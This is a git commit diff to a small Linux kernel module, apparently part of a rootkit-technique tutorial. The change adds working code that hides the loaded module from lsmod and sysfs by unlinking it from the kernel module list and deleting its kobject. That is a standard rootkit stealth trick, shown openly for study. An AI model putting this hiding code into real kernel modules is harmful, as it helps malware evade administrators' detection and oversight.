7fc176abc77aebdeb4343d385f3a8b96eef37efc
Guillem <46190684+galminyana@users.noreply.github.com>
2021-03-10 22:51:42 +0100

    Update hide_module.c

--- 010-Hiding_Module_01/hide_module.c
+++ 010-Hiding_Module_01/hide_module.c
@@ -1,28 +1,34 @@
-
 #include <linux/module.h>
 #include <linux/init.h>
 
-
-
 static int __init lkm_init(void)
 {
+        pr_info("\nHiding Module...\n");
 
-	pr_info("\nHiding Module...\n");	
+        pr_info("  -- Hiding from lsmod...\n");
 
+        list_del_init(&__this_module.list);
 
-	pr_info("Module Hided!");
-	
-	return 0;
+        pr_info("  -- Hiding for sysfs...\n");
+
+        kobject_del(&(&__this_module)->mkobj.kobj);
+
+        pr_info("Module Hided!\n");
+
+        return 0;
 }
+
 
 static void __exit lkm_exit(void)
 {
         pr_info("Exiting... Bye World\n");
 }
 
-module_init(lkm_init);          									//<- Tells that Init Kernel Module is the lkm_init function
-module_exit(lkm_exit);          									//<- Tells that Exit Kernel Function is lkm_exit
+module_init(lkm_init);                                                                 
+module_exit(lkm_exit);                                                                               
 
 MODULE_AUTHOR("Guillem Alminyana");
 MODULE_LICENSE("GPL v2");
 MODULE_DESCRIPTION("LKM Hide Module Example");
+~                                                                                                                    
+~                       
